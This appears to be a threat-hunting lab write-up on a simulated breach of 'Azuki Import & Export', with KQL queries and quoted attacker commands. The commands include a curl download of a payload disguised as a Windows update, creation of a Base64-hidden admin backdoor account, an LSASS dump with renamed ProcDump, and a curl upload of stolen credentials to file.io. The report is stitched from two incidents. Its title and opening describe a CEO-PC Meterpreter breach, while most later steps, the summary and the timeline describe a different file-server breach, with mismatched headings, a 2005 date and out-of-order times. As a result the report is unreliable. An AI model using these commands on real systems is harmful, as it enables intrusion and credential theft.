# Threat Hunt Report: CEO Administrative PC Breach via Meterpreter C2 and Advanced Credential Harvesting

## Executive Summary

Azuki Import & Export Trading Co. experienced continued malicious activity a few days after the file server breach that occurred between November 21-22, 2025. The attacker returned on November 25, 2025, and conducted lateral movement from a previously compromised workstation to the CEO's administrative PC (azuki-adminpc). The investigation revealed a multi-stage attack involving Meterpreter command-and-control implant deployment, persistent backdoor account creation, comprehensive credential theft from KeePass and Chrome browser databases, systematic data staging and compression, and exfiltration of eight archives totaling sensitive business data to gofile.io cloud storage. The threat actor demonstrated advanced operational security through renamed tools, masqueraded processes, and multiple persistence mechanisms. This investigation reconstructs the complete attack timeline and documents the threat actor's tactics, techniques, and procedures consistent with ADE SPIDER (APT-SL44, SilentLynx) operations.

## Background
- **Incident Date:** November 25, 2025  
- **Compromised Host:** azuki-adminpc (CEO Administrative PC)  
- **Threat Actor:** ADE SPIDER (APT-SL44, SilentLynx)  
- **Motivation:** Financial  
- **Target Profile:** Logistics and import/export companies, East Asia region  
- **Typical Dwell Time:** 21-45 days  
- **Attack Sophistication:** High, featuring Meterpreter C2, DPAPI credential theft, and multi-stage exfiltration

---

## Investigation Steps

### 1. Lateral Movement: Source System & Compromised Credentials

Searched for the source of lateral movement to the CEO's administrative PC and discovered consistent connection patterns from source IP address 10.1.0.204. The attacker established multiple RemoteInteractive sessions to azuki-adminpc during early morning hours (4-6 AM) on November 25, 2005. The clustering of connections during early morning hours indicates deliberate off-hours operational security to avoid detection. In addition, the investigation revealed that the yuki.tanaka account was compromised and subsequently reused for lateral movement to the CEO's administrative workstation. This account likely provided the attacker with elevated privileges and access to sensitive business systems. The investigation also confirmed that lateral movement from source IP 10.1.0.204 targeted azuki-adminpc, the CEO's administrative workstation.

**Query used to locate events:**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where LogonType == "RemoteInteractive"
| where RemoteIP != ""
| project TimeGenerated, DeviceName, RemoteIP, AccountName, LogonType
| order by TimeGenerated desc

```
<img width="2368" height="815" alt="BT_Q1" src="https://github.com/user-attachments/assets/0e866f91-b1ba-43df-b75a-3944af3ba2d5" />

---

### 2. Execution: Payload Hosting Service

Searched for evidence of connections to external file hosting services and discovered that the attacker used the file hosting service litter.catbox.moe to to host the malicious payload. This temporary anonymous file hosting service provides automatic file deletion after download, complicating forensic recovery. In addition, this represents infrastructure rotation from previous operations, demonstrating operational security awareness and attempts at evading network-based blocking.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where isnotempty(RemoteUrl)
| where RemoteUrl !has "microsoft" and RemoteUrl !has "windows" and RemoteUrl !has "adobe" and RemoteUrl !has "mcafee" and RemoteUrl !has "google"
| project TimeGenerated, DeviceName, RemoteUrl

```
<img width="1923" height="739" alt="BT_Q4" src="https://github.com/user-attachments/assets/7f6c69c3-cb4e-4b72-be3e-00c6f0c7358f" />

---

### 3. Execution: Malware Download

Searched for evidence of malware download and discovered that the attacker used the following command to download the malicious archive from the previously identified hosting service (i.e., litter.catbox.moe): "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z. The payload was disguised as a Windows security update (i.e., KB5044273) to appear legitimate and evade suspicion during download and execution phases. 

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where ProcessCommandLine contains "catbox" or ProcessCommandLine contains "litter"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2556" height="608" alt="BT_Q5" src="https://github.com/user-attachments/assets/d301cdf2-3cc9-43b9-8f9a-fcba0a2959d6" />

---

### 4. Execution: Archive Extraction 

Searched for evidence of the extraction of the KB5044273-x64.7z archive and discovered that the attacker used the following command to extract the password-protected archive using 7-Zip with password bypass and automatic yes to prompts: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where FileName in~ ("7z.exe", "7za.exe", "7zg.exe", "winrar.exe", "unzip.exe", "tar.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2569" height="953" alt="BT_Q6" src="https://github.com/user-attachments/assets/9745ff1f-e811-4def-b9dc-9856d960a0d5" />

---

### 5. Persistence: C2 Implant 

Searched for evidence of command and control implants used by attackers to maintain persistent access and enable remote control of compromised systems. The investigation revealed the extraction of the C2 beacon meterpreter.exe from the archive. Meterpreter is the famous payload/beacon from the Metasploit Framework, one of the most well-known offensive security/penetration testing tools. Meterpreter (short for "Meta-Interpreter") is a sophisticated C2 implant that runs in memory, provides interactive remote access, has extensive post-exploitation capabilities, and is commonly used by APT groups who repurpose legitimate pentesting tools.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where FolderPath has @"C:\Windows\Temp\cache"
| where ActionType == "FileCreated"
| where FileName endswith ".exe"
| project TimeGenerated, DeviceName, FileName, FolderPath
| order by TimeGenerated asc

```
<img width="2202" height="826" alt="BT_Q7" src="https://github.com/user-attachments/assets/b9f6e6fb-2a15-483f-a337-cc7e61edfc44" />

---

### 6. Persistence: Named Pipe 

Searched for evidence of named pipe event actions typically used to provide stealthy interprocess communication channels for malware. The named pipe "\Device\NamedPipe\msf-pipe-5902" was created by meterpreter.exe 3 minutes after meterpreter.exe was extracted from the archive (4:21:33 AM extraction → 4:24:35 AM pipe creation) using the Metasploit Framework naming convention (msf-pipe-*).

**Query used to locate events:**

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where InitiatingProcessFileName == "meterpreter.exe"
| where ActionType == "NamedPipeEvent"
| extend PipeName = parse_json(AdditionalFields).PipeName
| project TimeGenerated, DeviceName, ActionType, PipeName, InitiatingProcessFileName
| order by TimeGenerated asc

```
<img width="2120" height="667" alt="BT_Q8" src="https://github.com/user-attachments/assets/72da30ab-ca45-41f2-93bd-19bd574de8b0" />

---

### 7. Credential Access: Decoded Account Creation, Backdoor Account, & Decoded Privilege Escalation Command

Searched for evidence of encoded payloads and discovered two Base64-encoded PowerShell commands. The decoded account creation command was the following: net user yuki.tanaka2 B@ckd00r2024! /add. The decoded privilege escalation command was the following: net localgroup Administrators yuki.tanaka2 /add. Therefore, the attacker created a backdoor account yuki.tanaka2 (similar to the compromised user yuki.tanaka) with administrator privileges using Base64 obfuscation to evade detection. 
 
**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has "encodedcommand" or ProcessCommandLine has "-enc" or ProcessCommandLine has "-e "
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2765" height="330" alt="BT_Q9B" src="https://github.com/user-attachments/assets/02c5339b-5a0f-49bb-8b22-7db0a4dea9e8" />

---

### 8. Discovery: Session Enumeration 

Searched for evidence of terminal services enumeration and discovered that the command qwinsta was executed in order to enumerate RDP sessions, session IDs, session states, and logged-in users to identify active administrators and avoid detection. The attacker used this at 4:08 AM (before creating the backdoor account at 4:51 AM), likely to identify active administrators and see who was logged into the CEO's machine.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("qwinsta", "query session")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1973" height="297" alt="BT_Q12" src="https://github.com/user-attachments/assets/6f5920bd-9f6c-4929-b0dd-714fe66c5bb7" />

---

### 9. Discovery: Domain Trust Enumeration

Searched for evidence of 

credential file creation and discovered that the attacker created a credential file (i.e., IT-Admin-Passwords.csv)in the staging directory. This file contains exported credentials (e.g., IT administrator passwords), likely harvested from password managers, browser storage, or credential stores. The descriptive filename indicates the attacker organized their stolen data for easy identification during exfiltration.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FolderPath has "CBS"
| where FileName endswith ".csv"
| project TimeGenerated, FileName, FolderPath, ActionType

```
<img width="2160" height="275" alt="CH_Q11" src="https://github.com/user-attachments/assets/5522277f-9363-41b3-a2a5-9e97016cc7ff" />

---

### 10. Collection: Recursive Copy  

Searched for evidence of bulk data collection activities and discovered that the attacker used xcopy to recursively copy entire file share directories to the staging location using the following command: xcopy C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y. This command specifically targeted the IT-Admin share containing credential files and administrative documentation.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has_any ("robocopy", "xcopy")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2175" height="669" alt="CH_Q12" src="https://github.com/user-attachments/assets/19c0aeca-93d0-44df-afde-b0b72eb9e728" />

---
### 11. Collection: Compression

Searched for evidence of archive creation and discovered that the attacker used tar (i.e., a cross-platform compression tool not native to legacy Windows environments) to compress the staged credentials. The attacker utilized the following command to compress the IT-Admin credentials folder into a portable .tar.gz format suitable for exfiltration: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has_any ("7z", "tar", "rar")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2284" height="884" alt="CH_Q13" src="https://github.com/user-attachments/assets/275f8aa9-8da4-450c-bc71-e41f052f2c22" />

---

### 12. Credential Access: Renamed Tool

Searched for evidence of executable file creation events in attacker-controlled directories in order to identify renamed credential dumping tools since this is a common OPSEC practice used for evading signature-based detection. This analysis revealed that the attacker renamed a credential dumping tool to a short, inconspicuous name (i.e., "pd.exe") that could blend in with program data or system processes.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName endswith ".exe"
| where FolderPath has "Windows\\Logs\\CBS"
| where ActionType == "FileCreated"
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2203" height="283" alt="CH_Q14" src="https://github.com/user-attachments/assets/65c498e1-7125-4ff3-a2f7-ce552eab5d3f" />

---

### 13. Credential Access: Memory Dump 

Searched for evidence of credential dumping activities and discovered that ProcDump (renamed to pd.exe) was used to dump LSASS process memory using the command: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp. LSASS memory contains credentials for logged-on users, enabling the attacker to extract plaintext and hashed passwords for privilege escalation and lateral movement.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName == "pd.exe" or ProcessCommandLine has "pd.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1940" height="293" alt="CH_Q15" src="https://github.com/user-attachments/assets/f4dc6421-1080-4885-99dc-04814ddbb47a" />

---

### 14. Exfiltration: Upload & Cloud Service

Searched for evidence of data exfiltration and discovered that the attacker used curl with form-based transfer syntax (i.e., -F: Form-based file upload; multipart/form-data HTTP POST) to upload the compressed credential archive to a temporary file hosting service (i.e., file.io) using the command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. File.io is a temporary file hosting service that requires no authentication, automatically deletes files after download, leaves minimal traces for forensic investigation, blends with legitimate file sharing traffic, and provides anonymous upload capability.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName == "curl.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1776" height="595" alt="CH_Q16" src="https://github.com/user-attachments/assets/6740b98d-1933-40ec-8173-485f0e3991f5" />

---

### 15. Persistence: Registry Value Name & Beacon Filename

Searched for evidence of persistence and discovered the creation of a registry Run key with a value name designed to appear as legitimate software (i.e., FileShareSync). This registry value name was likely chosen to appear as legitimate file synchronization software (i.e., a service that would be expected on a file server). The persistence mechanism launches a hidden PowerShell script on every system startup, ensuring the attacker maintains access even after system reboots or credential changes. In addition, the beacon script (i.e., svchost.ps1) was named after the legitimate Windows Service Host (svchost.exe) process in order to make the file appear legitimate in directory listings, reduce suspicion if discovered during casual system inspection, or blend with legitimate Windows processes in monitoring tools. The PowerShell script serves as a persistence beacon, likely establishing command-and-control connectivity or executing additional payloads on system startup.

**Query used to locate events:**

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where RegistryKey has "Run"
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc

```
<img width="2468" height="338" alt="CH_Q18" src="https://github.com/user-attachments/assets/217c2811-c18a-4e62-9c05-f9ff8fb79bc6" />

---

### 16. Anti-Forensics: History File Deletion

Searched for anti-forensics activities and discovered the deletion of the PowerShell command history file (i.e., ConsoleHost_history.txt). This file logs all interactive PowerShell commands across sessions and is commonly targeted by attackers to remove evidence of their activities. The deletion occurred after the completion of data exfiltration and persistence establishment, indicating a deliberate attempt to cover tracks.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName has "history"
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2667" height="282" alt="CH_Q20B" src="https://github.com/user-attachments/assets/2f6b774f-3802-4b6d-a66b-1bfbdec660be" />

---

## Summary

The investigation revealed a sophisticated continuation of the initial Azuki Import & Export Trading Co. compromise. The attacker returned approximately 72 hours after initial access using a different source IP address (159.26.106.98), conducted lateral movement to the file server (azuki-fileserver01) using the compromised fileadmin account, and executed a multi-stage data exfiltration operation.

The threat actor demonstrated advanced tradecraft by conducting extensive reconnaissance (net share, net view, whoami /all, ipconfig /all), establishing a hidden staging directory (C:\Windows\Logs\CBS) disguised as Windows Component-Based Servicing logs, using Living Off the Land Binaries (certutil.exe, xcopy.exe, tar.exe, curl.exe) to avoid detection, renaming credential dumping tools (pd.exe) to evade signature-based detection, dumping LSASS memory to extract credentials, compressing stolen data into portable archives, exfiltrating data to file.io cloud storage, establishing registry-based persistence (FileShareSync) with a masqueraded beacon (svchost.ps1), and deleting PowerShell command history to remove forensic evidence.

The attack specifically targeted IT administrative credentials stored in IT-Admin-Passwords.csv and successfully exfiltrated this sensitive data along with LSASS memory dumps containing cached credentials. The sophistication of this attack, including the use of multiple defense evasion techniques, persistence mechanisms, and anti-forensics measures, is consistent with ADE SPIDER's known tactics, techniques, and procedures. The targeting of a logistics company in East Asia aligns with the group's established operational patterns and financial motivation.

---

## Timeline

| Time (UTC) | Action Observed | Key Evidence |
|:------------:|:-----------------:|:--------------:|
| 2025-11-21 19:42:01 | Remote Share Enumeration | net.exe view \\10.1.0.188 executed to enumerate backup server |
| 2025-11-22 00:42:24 | Privilege Enumeration | whoami.exe /all executed to enumerate security context |
| 2025-11-22 00:42:24 | Network Configuration | ipconfig.exe /all executed to enumerate network settings |
| 2025-11-22 00:55:43 | Defense Evasion: Directory Hiding | attrib.exe +h +s applied to C:\Windows\Logs\CBS staging directory |
| 2025-11-22 00:56:47 | Script Download | certutil.exe downloaded ex.ps1 from 78.141.196.6:8080 |
| 2025-11-22 03:57:51 | Credential File Discovery | IT-Admin-Passwords.csv accessed in IT-Admin file share |
| 2025-11-22 05:21:07 | Recursive Data Copy | xcopy.exe copied IT-Admin share to staging directory |
| 2025-11-22 05:31:30 | Compression | tar compressed IT-Admin data into credentials.tar.gz |
| 2025-11-22 08:19:38 | Renamed Tool Deployment | pd.exe (renamed ProcDump) created in staging directory |
| 2025-11-22 08:44:39 | Credential Dumping | pd.exe dumped LSASS memory (PID 876) to lsass.dmp |
| 2025-11-22 09:54:27 | Data Exfiltration | curl.exe uploaded credentials.tar.gz to file.io |
| 2025-11-22 02:10:50 | Persistence: Registry | FileShareSync value created in HKLM Run key launching svchost.ps1 |
| 2025-11-22 12:27:53 | Return Access | External RDP connection from 159.26.106.98 using kenji.sato |
| 2025-11-22 12:38:47 | Lateral Movement: RDP | mstsc.exe executed targeting 10.1.0.188 |
| 2025-11-22 14:01:16 | Anti-Forensics | ConsoleHost_history.txt deleted to remove PowerShell command evidence |
| 2025-11-24 14:40:54 | Lateral Movement: Logon | fileadmin account logged into azuki-fileserver01 from 10.1.0.108 |
| 2025-11-24 14:42:01 | Local Share Enumeration | net.exe share executed on azuki-fileserver01 |

---

**Note:** Network reconnaissance occurred on November 21, prior to the external RDP connection observed on November 22, suggesting potential earlier compromise through an unidentified vector.

---

## Relevant MITRE ATT&CK TTPs

| TTP ID | TTP Name | Description | Detection Relevance |
|:--------:|:----------:|:-------------:|:---------------------:|
| T1078 | Valid Accounts: Local Accounts | Compromised fileadmin account used for lateral movement to file server | Identifies authentication with compromised credentials from external sources |
| T1021.001 | Remote Services: Remote Desktop Protocol | External RDP connection from 159.26.106.98 and lateral movement via mstsc.exe to 10.1.0.108 | Detects unauthorized external RDP connections and internal lateral movement |
| T1135 | Network Share Discovery | net share and net view \\10.1.0.188 executed to enumerate local and remote shares | Indicates reconnaissance activity prior to data collection |
| T1033 | System Owner/User Discovery | whoami /all executed to enumerate current user privileges and group memberships | Identifies privilege enumeration prior to credential theft |
| T1016 | System Network Configuration Discovery | ipconfig /all executed to enumerate network adapter settings and domain information | Indicates comprehensive network reconnaissance activity |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | attrib +h +s applied to C:\Windows\Logs\CBS staging directory | Identifies attempts to conceal malicious artifacts through file attribute modification |
| T1074.001 | Data Staged: Local Data Staging | C:\Windows\Logs\CBS used to consolidate collected data before exfiltration | Detects data staging in non-standard locations mimicking system directories |
| T1105 | Ingress Tool Transfer | certutil.exe abused to download ex.ps1 from 78.141.196.6:8080 | Identifies LOLBin abuse for malware downloads |
| T1119 | Automated Collection | xcopy executed with /E /I /H /Y flags to recursively copy IT-Admin file share | Detects bulk data collection with attribute preservation |
| T1560.001 | Archive Collected Data: Archive via Utility | tar used to compress credentials.tar.gz with gzip compression | Identifies data compression prior to exfiltration using cross-platform tools |
| T1036.005 | Masquerading: Match Legitimate Name or Location | pd.exe (ProcDump renamed) and svchost.ps1 (PowerShell script) used to evade detection | Detects renamed tools and masqueraded filenames mimicking legitimate Windows components |
| T1003.001 | OS Credential Dumping: LSASS Memory | pd.exe (ProcDump) dumped LSASS process memory (PID 876) to lsass.dmp | Identifies credential theft from LSASS memory using legitimate administrative tools |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | curl uploaded credentials.tar.gz to file.io cloud storage | Detects data exfiltration to temporary file hosting services |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | FileShareSync registry value created in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Detects registry-based persistence mechanisms with deceptive value names |
| T1070.003 | Indicator Removal: Clear Command History | ConsoleHost_history.txt deleted to remove PowerShell command evidence | Identifies anti-forensics activities targeting command history files |

---

This table organizes the MITRE ATT&CK techniques (TTPs) observed during the investigation. The detection methods identified both the attack techniques and enabled confirmation of the threat actor's sophistication through multiple layers of defense evasion, persistence, and anti-forensics.

---

## Response Taken

| MITRE Mitigation ID | Name | Action Taken | Description | Relevance |
|:---------------------:|:------:|:--------------:|:-------------:|:-----------:|
| M1032 | Multi-factor Authentication | Enforced MFA | Enforced MFA for all RDP connections and privileged account access. Implemented conditional access policies requiring MFA for external connections. | Prevents lateral movement via compromised passwords by requiring additional authentication factors. |
| M1027 | Password Reset | Account Credential Reset | Reset credentials for fileadmin account and implemented mandatory password change with MFA enrollment. Rotated all passwords in IT-Admin-Passwords.csv. | Mitigates unauthorized access risks by invalidating potentially compromised credentials stored in exfiltrated files. |
| M1026 | Privileged Account Management | Administrative Access Review | Conducted comprehensive audit of all privileged accounts. Implemented principle of least privilege for file share access. | Prevents unauthorized access attempts by restricting administrative privileges to necessary personnel only. |
| M1054 | Software Configuration | LOLBin Restrictions | Implemented Group Policy to restrict certutil.exe execution to authorized administrators only. Configured application control policies to limit LOLBin abuse. | Prevents attackers from abusing legitimate Windows utilities for malware downloads and data exfiltration. |
| M1038 | Execution Prevention | Constrained Language Mode | Implemented PowerShell Constrained Language Mode on file servers to restrict unapproved script execution. | Prevents unauthorized PowerShell scripts like svchost.ps1 from executing malicious payloads. |
| M1047 | Audit | Enhanced PowerShell Logging | Enabled PowerShell script block logging and module logging across all endpoints to capture full command execution context including obfuscated scripts. | Enables early detection of future malicious PowerShell activity and provides forensic evidence even if ConsoleHost_history.txt is deleted. |
| M1042 | Disable or Remove Feature or Program | Restrict System Utilities | Restricted tar.exe and curl.exe execution through application control policies. Deployed monitoring for cross-platform compression tools. | Prevents abuse of legitimate utilities for data compression and exfiltration. |
| M1031 | Network Intrusion Prevention | Network Egress Filtering | Blocked outbound connections to file.io and similar temporary file hosting services. Implemented egress filtering for HTTP/HTTPS file uploads. | Prevents data exfiltration to cloud storage services commonly abused for data theft. |
| M1037 | Filter Network Traffic | RDP Access Restrictions | Restricted RDP access through jump servers with MFA. Implemented network segmentation to isolate file servers from workstations. | Limits lateral movement opportunities by enforcing strict access controls for remote connections. |
| M1030 | Network Segmentation | VLAN Segmentation | Deployed VLAN segmentation between workstations, file servers, and administrative systems with firewall rules enforcing least privilege access. | Compartmentalizes network to restrict lateral movement paths even with compromised credentials. |
| M1018 | User Account Management | Account Lockout Policy | Implemented stricter account lockout thresholds and account monitoring for suspicious activity detection including failed RDP attempts. | Adds security layers to prevent unauthorized access attempts through brute force or credential stuffing. |
| M1028 | Operating System Configuration | Application Control (WDAC) | Deployed Windows Defender Application Control policies to prevent execution of renamed binaries like pd.exe in non-standard directories. | Restricts execution of unauthorized applications through code integrity policies. |
| M1022 | Restrict File and Directory Permissions | File Share Hardening | Removed write permissions for standard users to sensitive file shares. Implemented file integrity monitoring for IT-Admin and other administrative shares. | Prevents unauthorized file access and detects suspicious modifications to sensitive data repositories. |
| M1041 | Encrypt Sensitive Information | Data at Rest Encryption | Implemented BitLocker encryption on file servers. Deployed file-level encryption for sensitive administrative files. | Protects stolen data from being useful to attackers even if exfiltrated. |
| M1053 | Data Backup | Offline Backup Strategy | Implemented offline backup copies stored separately from network-accessible locations. Verified backup integrity and restore procedures. | Ensures data recovery capability independent of compromised network systems. |
| M1017 | User Training | Security Awareness Training | Conducted mandatory security awareness training for affected users and IT staff, focusing on credential protection, recognizing suspicious RDP access, and reporting anomalous file server activity. | Reduces likelihood of future credential compromise through social engineering and improves detection of suspicious activities. |

---

The following response actions were recommended: (1) Isolating the compromised file server from the network to prevent further data exfiltration; (2) Resetting credentials for fileadmin account and all passwords stored in IT-Admin-Passwords.csv with mandatory MFA enrollment; (3) Removing persistence mechanisms including FileShareSync registry value and svchost.ps1 beacon script; (4) Deleting malicious artifacts including pd.exe, ex.ps1, lsass.dmp, and credentials.tar.gz from staging directory; (5) Implementing Group Policy restrictions on LOLBin execution (certutil, curl, tar) and PowerShell script execution; (6) Enabling enhanced PowerShell script block and module logging across all systems; (7) Blocking outbound connections to file.io and similar temporary file hosting services; (8) Implementing RDP access restrictions through jump servers with MFA and network segmentation; (9) Deploying Windows Defender Application Control policies to prevent renamed binary execution; (10) Hardening file share permissions and implementing file integrity monitoring; (11) Conducting mandatory security awareness training focusing on credential protection and suspicious activity recognition; (12) Implementing offline backup strategy independent of network-accessible systems.

---
